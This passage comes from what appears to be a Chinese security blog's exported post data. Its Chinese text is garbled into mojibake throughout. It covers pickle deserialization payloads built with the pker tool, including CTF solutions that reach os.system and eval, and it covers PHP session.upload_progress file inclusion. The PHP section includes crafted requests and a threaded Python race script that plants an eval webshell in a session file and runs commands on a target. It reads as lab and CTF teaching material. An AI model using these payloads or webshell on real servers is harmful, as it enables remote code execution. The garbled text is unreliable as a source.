ˆå¹¶è°ƒç”¨ï¼‰li[0]=321æˆ–globals_dic['local_var']='hello'å¯¹åº”opcodeï¼šb's'æ›´æ–°åˆ—è¡¨æˆ–å­—å…¸çš„æŸé¡¹çš„å€¼xx.attr=123å¯¹åº”opcodeï¼šb'b'å¯¹xxå¯¹è±¡è¿›è¡Œå±æ€§è®¾ç½®returnå¯¹åº”opcodeï¼šb'0'å‡ºæ ˆï¼ˆä½œä¸ºpickle.loadså‡½æ•°çš„è¿”å›å€¼ï¼‰ï¼šreturn xxx # æ³¨æ„ï¼Œä¸€æ¬¡åªèƒ½è¿”å›ä¸€ä¸ªå¯¹è±¡æˆ–ä¸è¿”å›å¯¹è±¡ï¼ˆå°±ç®—ç”¨é€—å·éš”å¼€ï¼Œæœ€åä¹Ÿåªè¿”å›ä¸€ä¸ªå…ƒç»„ï¼‰ æ³¨æ„ï¼š ç”±äºopcodeæœ¬èº«çš„åŠŸèƒ½é—®é¢˜ï¼Œpkerè‚¯å®šä¹Ÿä¸æ”¯æŒåˆ—è¡¨ç´¢å¼•ã€å­—å…¸ç´¢å¼•ã€ç‚¹å·å–å¯¹è±¡å±æ€§ä½œä¸ºå·¦å€¼ï¼Œéœ€è¦ç´¢å¼•æ—¶åªèƒ½å…ˆè·å–ç›¸åº”çš„å‡½æ•°ï¼ˆå¦‚getattrã€dict.getï¼‰æ‰èƒ½è¿›è¡Œã€‚ä½†æ˜¯å› ä¸ºå­˜åœ¨sã€uã€bæ“ä½œç¬¦ï¼Œä½œä¸ºå³å€¼æ˜¯å¯ä»¥çš„ã€‚å³â€œæŸ¥å€¼ä¸è¡Œï¼Œèµ‹å€¼å¯ä»¥â€ã€‚ pkerè§£æSæ—¶ï¼Œç”¨å•å¼•å·åŒ…è£¹å­—ç¬¦ä¸²ã€‚æ‰€ä»¥pkerä»£ç ä¸­çš„åŒå¼•å·ä¼šè¢«è§£æä¸ºå•å¼•å·opcode: 12test=&quot;123&quot;return test è¢«è§£æä¸ºï¼š 1b&quot;S'123'\\np0\\n0g0\\n.&quot; pkerï¼šå…¨å±€å˜é‡è¦†ç›– è¦†ç›–ç›´æ¥ç”±æ‰§è¡Œæ–‡ä»¶å¼•å…¥çš„secretæ¨¡å—ä¸­çš„nameä¸categoryå˜é‡ï¼š 1234secret=GLOBAL('__main__', 'secret') # pythonçš„æ‰§è¡Œæ–‡ä»¶è¢«è§£æä¸º__main__å¯¹è±¡ï¼Œsecretåœ¨è¯¥å¯¹è±¡ä»å±ä¸‹secret.name='1'secret.category='2' è¦†ç›–å¼•å…¥æ¨¡å—çš„å˜é‡ï¼š 12game = GLOBAL('guess_game', 'game')game.curr_ticket = '123' æ¥ä¸‹æ¥ä¼šç»™å‡ºä¸€äº›å…·ä½“çš„åŸºæœ¬æ“ä½œçš„å®ä¾‹ã€‚ pkerï¼šå‡½æ•°æ‰§è¡Œ é€šè¿‡b'R'è°ƒç”¨ï¼š 1234s='whoami'system = GLOBAL('os', 'system')system(s) # `b'R'`è°ƒç”¨return é€šè¿‡b'i'è°ƒç”¨ï¼š 1INST('os', 'system', 'whoami') é€šè¿‡b'c'ä¸b'o'è°ƒç”¨ï¼š 1OBJ(GLOBAL('os', 'system'), 'whoami') å¤šå‚æ•°è°ƒç”¨å‡½æ•° 12INST('[module]', '[callable]'[, par0,par1...])OBJ(GLOBAL('[module]', '[callable]')[, par0,par1...]) pkerï¼šå®ä¾‹åŒ–å¯¹è±¡ å®ä¾‹åŒ–å¯¹è±¡æ˜¯ä¸€ç§ç‰¹æ®Šçš„å‡½æ•°æ‰§è¡Œ 12345animal = INST('__main__', 'Animal','1','2')return animal# æˆ–è€…animal = OBJ(GLOBAL('__main__', 'Animal'), '1','2')return animal å…¶ä¸­ï¼ŒpythonåŸæ–‡ä»¶ä¸­åŒ…å«ï¼š 1234class Animal: def __init__(self, name, category): self.name = name self.category = category ä¹Ÿå¯ä»¥å…ˆå®ä¾‹åŒ–å†èµ‹å€¼ï¼š 1234animal = INST('__main__', 'Animal')animal.name='1'animal.category='2'return animal æ‰‹åŠ¨è¾…åŠ© æ‹¼æ¥opcodeï¼šå°†ç¬¬ä¸€ä¸ªpickleæµç»“å°¾è¡¨ç¤ºç»“æŸçš„.å»æ‰ï¼Œä¸¤è€…æ‹¼æ¥èµ·æ¥å³å¯ã€‚ å»ºç«‹æ™®é€šçš„ç±»æ—¶ï¼Œå¯ä»¥å…ˆpickle.dumpsï¼Œå†æ‹¼æ¥è‡³payloadã€‚ pkerï¼šCTFå®æˆ˜ åœ¨å®é™…ä½¿ç”¨pkeræ—¶ï¼Œé¦–å…ˆéœ€è¦æœ‰å¤§æ¦‚çš„æ€è·¯ï¼Œä¿è¯èƒ½åšåˆ°æ‰‹å†™æ¯ä¸€æ­¥çš„opcodeï¼Œç„¶åä½¿ç”¨pkerå¯¹æ€è·¯è¿›è¡Œå®ç°ã€‚ Code-Breaking: picklecodeè§£ææ€è·¯è§å‰æ–‡æ‰‹å†™opcodeçš„CTFå®æˆ˜éƒ¨åˆ†ï¼Œpkerä»£ç ä¸ºï¼š 12345678getattr=GLOBAL('builtins','getattr')dict=GLOBAL('builtins','dict')dict_get=getattr(dict,'get')glo_dic=GLOBAL('builtins','globals')()builtins=dict_get(glo_dic,'builtins')eval=getattr(builtins,'eval')eval('print(&quot;123&quot;)')return BalsnCTF:pyshv1123456789101112131415whitelist = ['sys']class RestrictedUnpickler(pickle.Unpickler): def find_class(self, module, name): if module not in whitelist or '.' in name: raise KeyError('The pickle is spoilt :(') return pickle.Unpickler.find_class(self, module, name)def loads(s): &quot;&quot;&quot;Helper function analogous to pickle.loads().&quot;&quot;&quot; return RestrictedUnpickler(io.BytesIO(s)).load()dumps = pickle.dumps é¢˜ç›®çš„find_classåªå…è®¸sysæ¨¡å—ï¼Œå¹¶ä¸”å¯¹è±¡åä¸­ä¸èƒ½æœ‰.å·ã€‚æ„å›¾å¾ˆæ˜æ˜¾ï¼Œé™åˆ¶å­æ¨¡å—ï¼Œåªå…è®¸ä¸€çº§æ¨¡å—ã€‚sysæ¨¡å—æœ‰ä¸€ä¸ªå­—å…¸å¯¹è±¡modulesï¼Œå®ƒåŒ…å«äº†è¿è¡Œæ—¶æ‰€æœ‰pyç¨‹åºæ‰€å¯¼å…¥çš„æ‰€æœ‰æ¨¡å—ï¼Œå¹¶å†³å®šäº†pythonå¼•å…¥çš„æ¨¡å—ï¼Œå¦‚æœå­—å…¸è¢«æ”¹å˜ï¼Œå¼•å…¥çš„æ¨¡å—å°±ä¼šæ”¹å˜ã€‚modulesä¸­è¿˜åŒ…æ‹¬äº†sysæœ¬èº«ã€‚æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è‡ªå·±åŒ…å«è‡ªå·±è¿™ç‚¹ç»•è¿‡é™åˆ¶ï¼Œå…·ä½“è¿‡ç¨‹ä¸ºï¼š ç”±äºsysè‡ªèº«è¢«åŒ…å«åœ¨è‡ªèº«çš„å­ç±»é‡Œï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ç‚¹ä½¿ç”¨sèµ‹å€¼ï¼Œå‘åé€’è¿›ä¸€çº§ï¼Œå¼•å…¥sys.modulesçš„å­æ¨¡å—ï¼šsys.modules['sys']=sys.modulesï¼Œæ­¤æ—¶å°±ç›¸å½“äºsys=sys.modulesã€‚è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨åŸsys.modulesä¸‹çš„å¯¹è±¡äº†ï¼Œå³sys.modules.xxxã€‚ é¦–å…ˆè·å–modulesçš„getå‡½æ•°ï¼Œç„¶åç±»ä¼¼äºä¸Šä¸€æ­¥ï¼Œå†ä½¿ç”¨sæŠŠmodulesä¸­çš„sysæ¨¡å—æ›´æ–°ä¸ºosæ¨¡å—ï¼šsys['sys']=sys.get('os')ã€‚ ä½¿ç”¨cè·å–systemï¼Œä¹‹åå°±å¯ä»¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤äº†ã€‚ æ•´ä¸ªåˆ©ç”¨è¿‡ç¨‹è¿˜æ˜¯å¾ˆå·§å¦™çš„ï¼Œpkerä»£ç ä¸ºï¼š 12345678modules=GLOBAL('sys', 'modules')modules['sys']=modulesmodules_get=GLOBAL('sys', 'get')os=modules_get('os')modules['sys']=ossystem=GLOBAL('sys', 'system')system('whoami')return æ›´å¤šæ¡ˆä¾‹","link":"/2024/02/06/python%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"},{"title":"sessionç›¸å…³æ¼æ´","text":"sessionä»€ä¹ˆæ˜¯sessionå®˜æ–¹Sessionå®šä¹‰ï¼šåœ¨è®¡ç®—æœºä¸­ï¼Œå°¤å…¶æ˜¯åœ¨ç½‘ç»œåº”ç”¨ä¸­ï¼Œç§°ä¸ºâ€œä¼šè¯æ§åˆ¶â€ã€‚Session å¯¹è±¡å­˜å‚¨ç‰¹å®šç”¨æˆ·ä¼šè¯æ‰€éœ€çš„å±æ€§åŠé…ç½®ä¿¡æ¯ã€‚ä¸»è¦æœ‰ä»¥ä¸‹ç‰¹ç‚¹ï¼š sessinä¿å­˜çš„ä½ç½®æ˜¯åœ¨æœåŠ¡å™¨ç«¯sessioné€šå¸¸æ˜¯è¦é…åˆcookieä½¿ç”¨å› ä¸ºHTTPçš„æ— çŠ¶æ€æ€§ï¼ŒæœåŠ¡ç«¯äº§ç”Ÿäº†sessionæ¥æ ‡è¯†å½“å‰çš„ç”¨æˆ·çŠ¶æ€ æœ¬è´¨ä¸Šï¼Œsessionå°±æ˜¯ä¸€ç§å¯ä»¥ç»´æŒæœåŠ¡å™¨ç«¯çš„æ•°æ®å­˜å‚¨æŠ€æœ¯ã€‚å³sessionæŠ€æœ¯å°±æ˜¯ä¸€ç§åŸºäºåç«¯æœ‰åˆ«äºæ•°æ®åº“çš„ä¸´æ—¶å­˜å‚¨æ•°æ®çš„æŠ€æœ¯ session.upload_progressæˆ‘å…ˆä»å¤´åˆ°å°¾åˆ†æä¸€ä¸‹åˆ©ç”¨session.upload_progressè¿›è¡Œæ–‡ä»¶åŒ…å« ç›¸å…³é…ç½®åœ¨è®²è¯¥å§¿åŠ¿çš„å…·ä½“åˆ©ç”¨æ–¹æ³•ä¹‹å‰ï¼Œè¦å…ˆè®²å‡ ä¸ª php.ini ä¸­çš„ç›¸å…³é…ç½®ï¼Œè¿™ä¹Ÿæ˜¯åˆ©ç”¨è¯¥æ–¹å¼è¿›è¡Œæ–‡ä»¶åŒ…å«çš„å‰æï¼Œæ­¤ç‰¹æ€§è‡ª PHP 5.4.0 åå¯ç”¨ã€‚ 123456session.auto_start = offsession.upload_progress.enabled = onsession.upload_progress.cleanup = onsession.upload_progress.prefix = &quot;upload_progress_&quot;session.upload_progress.name = &quot;PHP_SESSION_UPLOAD_PROGRESS&quot;session.save_path= &quot;/var/lib/php/sessions&quot; 1234567enabled=onè¡¨ç¤ºupload_progressåŠŸèƒ½å¼€å§‹ï¼Œä¹Ÿæ„å‘³ç€å½“æµè§ˆå™¨å‘æœåŠ¡å™¨ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶æ—¶ï¼Œphpå°†ä¼šæŠŠæ­¤æ¬¡æ–‡ä»¶ä¸Šä¼ çš„è¯¦ç»†ä¿¡æ¯(å¦‚ä¸Šä¼ æ—¶é—´ã€ä¸Šä¼ è¿›åº¦ç­‰)å­˜å‚¨åœ¨sessionå½“ä¸­ ï¼›cleanup=onè¡¨ç¤ºå½“æ–‡ä»¶ä¸Šä¼ ç»“æŸåï¼Œphpå°†ä¼šç«‹å³æ¸…ç©ºå¯¹åº”sessionæ–‡ä»¶ä¸­çš„å†…å®¹ï¼Œè¿™ä¸ªé€‰é¡¹éå¸¸é‡è¦ï¼›nameå½“å®ƒå‡ºç°åœ¨è¡¨å•ä¸­ï¼Œphpå°†ä¼šæŠ¥å‘Šä¸Šä¼ è¿›åº¦ï¼Œæœ€å¤§çš„å¥½å¤„æ˜¯ï¼Œå®ƒçš„å€¼å¯æ§ï¼›prefix+nameå°†è¡¨ç¤ºä¸ºsessionä¸­çš„é”®å å½“ session.upload_progress.enabledINI é€‰é¡¹å¼€å¯æ—¶ï¼ŒPHP èƒ½å¤Ÿåœ¨æ¯ä¸€ä¸ªæ–‡ä»¶ä¸Šä¼ æ—¶ç›‘æµ‹ä¸Šä¼ è¿›åº¦ã€‚ è¿™ä¸ªä¿¡æ¯å¯¹ä¸Šä¼ è¯·æ±‚è‡ªèº«å¹¶æ²¡æœ‰ä»€ä¹ˆå¸®åŠ©ï¼Œä½†åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶åº”ç”¨å¯ä»¥å‘é€ä¸€ä¸ªPOSTè¯·æ±‚åˆ°ç»ˆç«¯ï¼ˆä¾‹å¦‚é€šè¿‡XHRï¼‰æ¥æ£€æŸ¥è¿™ä¸ªçŠ¶æ€ å½“ä¸€ä¸ªä¸Šä¼ åœ¨å¤„ç†ä¸­ï¼ŒåŒæ—¶POSTä¸€ä¸ªä¸INIä¸­è®¾ç½®çš„session.upload_progress.nameåŒåå˜é‡æ—¶ï¼Œä¸Šä¼ è¿›åº¦å¯ä»¥åœ¨$_SESSIONä¸­è·å¾—ã€‚ å½“PHPæ£€æµ‹åˆ°è¿™ç§POSTè¯·æ±‚æ—¶ï¼Œå®ƒä¼šåœ¨$_SESSIONä¸­æ·»åŠ ä¸€ç»„æ•°æ®, ç´¢å¼•æ˜¯ session.upload_progress.prefixä¸ session.upload_progress.nameè¿æ¥åœ¨ä¸€èµ·çš„å€¼ã€‚ é€šå¸¸è¿™äº›é”®å€¼å¯ä»¥é€šè¿‡è¯»å–INIè®¾ç½®æ¥è·å¾—ï¼Œä¾‹å¦‚ 1234&lt;?php$key = ini_get(&quot;session.upload_progress.prefix&quot;) . ini_get(&quot;session.upload_progress.name&quot;);var_dump($_SESSION[$key]);?&gt; å­˜å‚¨æœºåˆ¶å½“å¼€å¯sessionæ—¶ï¼ŒæœåŠ¡å™¨éƒ½ä¼šåœ¨ä¸€ä¸ªä¸´æ—¶ç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªsessionæ–‡ä»¶æ¥ä¿å­˜ä¼šè¯ä¿¡æ¯ï¼Œæ–‡ä»¶åæ ¼å¼ä¸º sess_PHPSESSID ã€‚åœ¨linuxç³»ç»Ÿä¸­ï¼Œsessionæ–‡ä»¶ä¸€èˆ¬ä¿å­˜åœ¨ä»¥ä¸‹å‡ ä¸ªç›®å½•ï¼šä»¥session.save_pathä¸ºä¾æ® 1234/var/lib/php//var/lib/php/sessions//tmp//tmp/sessions/ åˆ†æé—®é¢˜ä¸€ä»£ç é‡Œæ²¡æœ‰session_start(),å¦‚ä½•åˆ›å»ºsessionæ–‡ä»¶å‘¢ã€‚ å…¶å®ï¼Œå¦‚æœsession.auto_start=On ï¼Œåˆ™PHPåœ¨æ¥æ”¶è¯·æ±‚çš„æ—¶å€™ä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionï¼Œä¸å†éœ€è¦æ‰§è¡Œsession_start()ã€‚ä½†é»˜è®¤æƒ…å†µä¸‹ï¼Œè¿™ä¸ªé€‰é¡¹éƒ½æ˜¯å…³é—­çš„ã€‚ ä½†sessionè¿˜æœ‰ä¸€ä¸ªé»˜è®¤é€‰é¡¹ï¼Œsession.use_strict_modeé»˜è®¤å€¼ä¸º0ã€‚æ­¤æ—¶ç”¨æˆ·æ˜¯å¯ä»¥è‡ªå·±å®šä¹‰Session IDçš„ã€‚æ¯”å¦‚ï¼Œæˆ‘ä»¬åœ¨Cookieé‡Œè®¾ç½®PHPSESSID=zixydï¼ŒPHPå°†ä¼šåœ¨æœåŠ¡å™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ï¼šsess_zixydã€‚å³ä½¿æ­¤æ—¶ç”¨æˆ·æ²¡æœ‰åˆå§‹åŒ–Sessionï¼ŒPHPä¹Ÿä¼šè‡ªåŠ¨åˆå§‹åŒ–Sessionã€‚ å¹¶äº§ç”Ÿä¸€ä¸ªé”®å€¼ï¼Œè¿™ä¸ªé”®å€¼æœ‰ini.get(â€œsession.upload_progress.prefixâ€)+ç”±æˆ‘ä»¬æ„é€ çš„session.upload_progress.nameå€¼ç»„æˆï¼Œæœ€åè¢«å†™å…¥sess_zixydã€‚ é—®é¢˜äºŒä½†æ˜¯é—®é¢˜æ¥äº†ï¼Œé»˜è®¤é…ç½®session.upload_progress.cleanup = onå¯¼è‡´æ–‡ä»¶ä¸Šä¼ åï¼Œsessionæ–‡ä»¶å†…å®¹ç«‹å³æ¸…ç©ºï¼Œ éœ€è¦æ¡ä»¶ç«äº‰ å®éªŒä¸€åœ¨kaliä¸­å¼€å¯nginx;å¹¶åˆ›å»ºindex.phpæ–‡ä»¶å†…å®¹å¦‚ä¸‹: 1234567891011&lt;?phphighlight_file(__FILE__);session_start();if($_POST['zixyd']){ include $_POST['zixyd'];}phpinfo();?&gt; ä½¿ç”¨äº†session_startå‡½æ•°ï¼Œå¹¶ä¸”å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œä½†æ˜¯æœåŠ¡å™¨ä¸Šå´æ²¡æœ‰æ¶æ„çš„æ–‡ä»¶åŒ…å«å¯ä»¥getwebshellæ—¶ï¼Œè¿™æ—¶å¯ä»¥åˆ©ç”¨session.upload_progress æ–¹æ³•ä¸€(bp)åˆ›å»ºä¸€ä¸ªå¯ä»¥ä¸Šä¼ æ–‡ä»¶çš„htmlæ–‡ä»¶ 123456789&lt;html&gt;&lt;body&gt;&lt;form action=&quot;http://192.168.6.98/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt; &lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;1&lt;?php cat('cat /flag.txt');?&gt;&quot; /&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt; &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶å¹¶æŠ“åŒ…å‘é€åˆ°intruderæ¨¡å—ï¼Œæ³¨æ„æ˜¯éšä¾¿ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶,è¿™é‡Œæˆ‘ä»¬åªéœ€è¦åˆ©ç”¨åœ¨æ–‡ä»¶ä¸Šä¼ æ—¶PHP_SESSION_UPLOAD_PROGRESSå’ŒCookieä¸­PHPSESSIDçš„å€¼,è€Œå’Œä¸Šä¼ ä»€ä¹ˆæ–‡ä»¶æ— å…³ï¼Œè¿™ä¸ªåŒ…æ˜¯ä¸ºäº†æ¡ä»¶ç«äº‰åˆ¶ä½œæ¶æ„æ–‡ä»¶çš„ 123456789101112131415161718192021222324252627POST /index.php HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Cookie: PHPSESSID=zixydAccept-Encoding: gzip, deflateContent-Type: multipart/form-data; boundary=---------------------------32681549875692968181236391716Content-Length: 4686Origin: nullConnection: closeUpgrade-Insecure-Requests: 1-----------------------------32681549875692968181236391716Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;Â§1Â§&lt;?php system('cat /flag.txt');?&gt;-----------------------------32681549875692968181236391716Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;1.md&quot;Content-Type: application/octet-stream```https://www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c32cb_ORWtGGSc0A92https://www.cisp.cn/xe.exam.question_detail/1.0.0?exam_id=ex_658291545c15c_ANrAAwOo&amp;uexam_id=uexam_6597ca52a0682_TvyRy60JZl&amp;qid=qs_6164e344c33f5_FmQaeCt30A88``` å†æŠ“ä¸€ä¸ªåŒ…å‘é€åˆ°intruderæ¨¡å—ï¼Œè¿™ä¸ªåŒ…å­˜åœ¨ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´ï¼Œæ˜¯ä¸ºäº†åŒ…å«æ¶æ„æ–‡ä»¶çš„ 123456789101112131415POST / HTTP/1.1Host: 192.168.6.98User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/118.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 48Origin: http://192.168.6.98Connection: closeReferer: http://192.168.6.98/Cookie: PHPSESSID=rou5qd86se828i5on12sl79fp6Upgrade-Insecure-Requests: 1zixyd=%2Fvar%2Flib%2Fphp%2Fsessions%2Fsess_zixyd&amp;haha=Â§1Â§ æˆåŠŸ æ–¹æ³•äºŒ(python)12345678910111213141516171819202122232425262728293031323334353637383940414243# -*- encoding:utf-8 -*-import ioimport threadingimport requestsurl = &quot;http://192.168.6.98/&quot;sessid = 'zixyd'def write(session): filebytes = io.BytesIO(b'a'*1024*50) while True: session.post(url=url,data = { 'PHP_SESSION_UPLOAD_PROGRESS': '&lt;?php eval($_POST[2]);?&gt;' },cookies={ 'PHPSESSID':sessid },files={ 'file': ('zixyd.jpg',filebytes) })def read(session): while True: res1 = session.post(url=url, data={ 'zixyd': r&quot;/var/lib/php/sessions/sess_&quot;+ sessid, '2': r&quot;system('cat /flag.txt');&quot; }) if 'flag' in res1.text: print(res1.text.encode('gbk','ignore').decode('gbk')) # else: # print(&quot;retry~~~~&quot;)if __name__ == '__main__': with requests.session() as session: for i in range(20): threading.Thread(target=write,args=(session,)).start() for i in range(20): threading.Thread(target=read,args=(session,)).start() è¾“å‡ºå¦‚ä¸‹ï¼šå¯ä»¥å¾ˆæ˜æ˜¾çš„çœ‹åˆ°æ˜¯ç”±â€œupload_progress_â€å’Œ&lt;?php eval($_POST[2]);?&gt;ä¸ºé”®å€¼ï¼Œ|åé¢çš„å°±æ˜¯sessionä¸­å­˜å‚¨çš„ä¸Šä¼ è¿›åº¦æ—¶çš„ä¿¡æ¯ï¼›åªä¸è¿‡&lt;?php eval($_POST[2]);?&gt;å·²ç»è¢«phpè§£æäº†å˜æˆäº†flag{this is fuck flag}ï¼Œè¿™é‡Œä¹Ÿå¯ä»¥çœ‹å‡ºå¦ä¸€ç‚¹ï¼šsession.serialize_handler = php,è¿™ä¸sessionäº§ç”Ÿååºåˆ—æ¼æ´æœ‰å…³ 12upload_progress_flag{this is fuck flag}|a:5:{s:10:&quot;start_time&quot;;i:1704606442;s:14:&quot;content_length&quot;;i:51477;s:15:&quot;bytes_processed&quot;;i:5250;s:4:&quot;done&quot;;b:0;s:5:&quot;files&quot;;a:1:{i:0;a:7:{s:10:&quot;field_name&quot;;s:4:&quot;file&quot;;s:4:&quot;name&quot;;s:9:&quot;zixyd.jpg&quot;;s:8:&quot;tmp_name&quot;;N;s:5:&quot;error&quot;;i:0;s:4:&quot;done&quot;;b:0;s:10:&quot;start_time&quot;;i:1704606442;s:15:&quot;bytes_processed&quot;;i:5250;}}} session_unserPHP sessionåºåˆ—åŒ–æœºåˆ¶æ ¹æ®php.iniä¸­çš„é…ç½®é¡¹ï¼Œæˆ‘ä»¬ç ”ç©¶å°†$_SESSIONä¸­ä¿å­˜çš„æ‰€æœ‰æ•°æ®åºåˆ—åŒ–å­˜å‚¨åˆ°PHPSESSIDå¯¹åº”çš„æ–‡ä»¶ä¸­ï¼Œä½¿ç”¨çš„ä¸‰ç§ä¸åŒçš„å¤„ç†æ ¼å¼ï¼Œå³session.serialize_handlerå®šä¹‰çš„ä¸‰ç§å¼•æ“ï¼š å¤„ç†å™¨ php é”®å ï¼‹ ç«–çº¿ ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_binary é”®åçš„é•¿åº¦å¯¹åº”çš„ ASCII å­—ç¬¦ ï¼‹ é”®å ï¼‹ ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„å€¼ php_serialize (php&gt;=5.5.4) ç»è¿‡ serialize() å‡½æ•°ååºåˆ—å¤„ç†çš„æ•°ç»„ phpå¤„ç†å™¨è¿™é‡Œä¸ºäº†åŠ æ·±è¯´æ˜é™¤äº†session_startå‡½æ•°ï¼Œè¿˜å¯ä»¥ç”¨session.auto_starté…ç½®ï¼Œæˆ‘æ¥ä¸‹æ¥çš„ä½¿ç”¨å°†ä¸ä½¿ç”¨å‡½æ•°ï¼Œè€Œæ˜¯æ›´æ”¹é…ç½®;ï¼ˆè¿™æ ·æ”¹é…ç½®æœ¬æ¥æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯è¿™æ ·æ”¹é…ç½®è¾¾ä¸åˆ°çœ‹å¤„ç†å™¨ä¸åŒè€Œå­˜å‚¨çš„åºåˆ—åŒ–æ•°æ®ä¸åŒï¼Œå¬ä¸æ‡‚ï¼Ÿ ä¸‹é¢ä¼šè¯´æ˜ï¼‰ æˆ‘çš„å®éªŒç¯å¢ƒæ˜¯ï¼škali+nginx+fpm 123456789101112131415â”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo find / -name php.ini /var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/apache2/php.ini/var/lib/docker/overlay2/6caa6f28e81c757ee588fab97a4e7c7cad8bd0fe73be2dbee11c82589c664d06/diff/etc/php5/cli/php.ini/etc/php/8.2/apache2/php.ini/etc/php/8.2/cli/php.ini/etc/php/8.2/fpm/php.iniâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ sudo vim /etc/php/8.2/fpm/php.iniä¿®æ”¹ï¼š session.auto_start = 1é‡å¯fpmæœåŠ¡ä½¿å¾—php.iniç”Ÿæ•ˆâ”Œâ”€â”€(kaliã‰¿kali)-[~]â””â”€$ systemctl restart php8.2-fpm.service æµ‹è¯•ä»£ç  1234567&lt;?phphighlight_file(__FILE__);$_SESSION['name'] = $_GET['name'];echo $_SESSION['name'];?&gt; è¿™é‡Œå¯ä»¥çœ‹åˆ°ï¼Œæœªä½¿ç”¨session_startå‡½æ•°;Cookieå´å­˜åœ¨PHPSESSID æ¥çœ‹çœ‹phpå¤„ç†å™¨å°†æ•°æ®åºåˆ—åŒ–çš„å½¢å¼ 1234567891011121314â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# pwd /var/lib/php/sessions â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# ls -alæ€»è®¡ 772drwx-wx-wt 2 root root 778240 1æœˆ 7æ—¥ 14:25 .drwxr-xr-x 4 root root 4096 2023å¹´ 4æœˆ 5æ—¥ ..-rw------- 1 www-data www-data 17 1æœˆ 7æ—¥ 14:25 sess_bb95aoqqkmvq2ltbpcdlu16hvh â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# cat sess_bb95aoqqkmvq2ltbpcdlu16hvh name|s:5:&quot;zixyd&quot;; php_serializeå¤„ç†å™¨12345678910&lt;?phphighlight_file(__FILE__);ini_set('session.serialize_handler','php_serialize');$_SESSION['name'] = $_GET['name'];echo $_SESSION['name'];?&gt; è¿™é‡Œæˆ‘å·²ç»å°†session.serialize_handleræ”¹æˆäº†php_serialize ä½†æ˜¯æ•°æ®å‡½æ•°ä»¥phpå¤„ç†å™¨æ–¹å¼å­˜å‚¨çš„ï¼›ç»è¿‡æ’æŸ¥æ‰¾åˆ°åŸå› ï¼šini_set('session.serialize_handler','php_serialize');åªå¯¹å½“å‰æ–‡ä»¶çš„session_startå‡½æ•°æœ‰æ•ˆï¼›è€Œå¯¹php.iniä¸­çš„é…ç½®æ— æ•ˆï¼Œ 1234567891011â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# ls -alæ€»è®¡ 776drwx-wx-wt 2 root root 778240 1æœˆ 7æ—¥ 14:40 .drwxr-xr-x 4 root root 4096 2023å¹´ 4æœˆ 5æ—¥ ..-rw------- 1 www-data www-data 17 1æœˆ 7æ—¥ 14:25 sess_bb95aoqqkmvq2ltbpcdlu16hvh-rw------- 1 www-data www-data 17 1æœˆ 7æ—¥ 14:40 sess_mekil2i1boqaof0g4rohu4ef8p â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# cat sess_mekil2i1boqaof0g4rohu4ef8pname|s:5:&quot;zixyd&quot;; æ‰€ä»¥æˆ‘åˆå°†php.iniä¸­çš„session.autoæ”¹å›äº†0ï¼Œå¹¶åœ¨æ–‡ä»¶ä¸­æ·»åŠ session_start(); 123â”Œâ”€â”€(rootã‰¿kali)-[/var/lib/php/sessions]â””â”€# cat sess_6bf6o57tcu6h8735crmc0845e1a:1:{s:4:&quot;name&quot;;s:5:&quot;zixyd&quot;;} 12php: name|s:5:&quot;zixyd&quot;; php_serialize: a:1:{s:4:&quot;name&quot;;s:5:&quot;zixyd&quot;;} 